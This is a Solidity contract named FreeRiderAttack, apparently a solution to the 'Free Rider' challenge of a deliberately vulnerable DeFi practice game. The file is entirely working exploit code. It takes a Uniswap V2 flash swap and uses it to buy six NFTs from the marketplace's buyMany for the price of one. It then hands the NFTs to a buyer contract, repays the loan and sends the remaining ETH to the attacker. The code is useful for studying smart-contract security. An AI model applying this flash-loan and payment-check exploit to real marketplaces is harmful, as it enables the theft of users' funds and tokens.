// SPDX-License-Identifier: MIT
pragma solidity =0.6.6;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";

interface IFreeRiderNFTMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IDamnValuableNFT {
    function safeTransferFrom(
        address _from,
        address _to,
        uint256 _tokenId
    ) external payable;
}

interface IWETH9 {
    function deposit() external payable;

    function withdraw(uint256 wad) external;

    function transfer(address dst, uint256 wad) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

contract FreeRiderAttack is IUniswapV2Callee {
    IUniswapV2Pair pair;
    IFreeRiderNFTMarketplace marketplace;
    IDamnValuableNFT nft;
    IWETH9 weth;
    address buyerContractAddress;
    address attacker;
    uint256[] tokenIds;
    uint256 constant nftPrice = 15 ether;

    constructor(
        IUniswapV2Pair _pair,
        IFreeRiderNFTMarketplace _marketplace,
        IDamnValuableNFT _nft,
        IWETH9 _weth,
        address _buyerContractAddress
    ) public payable {
        pair = _pair;
        marketplace = _marketplace;
        nft = _nft;
        weth = _weth;
        buyerContractAddress = _buyerContractAddress;
        attacker = msg.sender;
        for (uint256 i = 0; i < 6; i++) {
            tokenIds.push(i);
        }
    }

    function attack() external {
        pair.swap(nftPrice, 0, address(this), bytes("0"));
    }

    function uniswapV2Call(
        address,
        uint256 amountReceived,
        uint256,
        bytes calldata
    ) external override {
        weth.withdraw(amountReceived);

        marketplace.buyMany{value: amountReceived}(tokenIds);
        for (uint256 i = 0; i < tokenIds.length; i++) {
            nft.safeTransferFrom(
                address(this),
                buyerContractAddress,
                tokenIds[i]
            );
        }

        uint256 repaymentAmount = (amountReceived * 1000) / 997 + 1;
        weth.deposit{value: repaymentAmount}();
        weth.transfer(msg.sender, repaymentAmount);

        payable(attacker).transfer(address(this).balance);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return
            bytes4(
                keccak256("onERC721Received(address,address,uint256,bytes)")
            );
    }

    receive() external payable {}
}
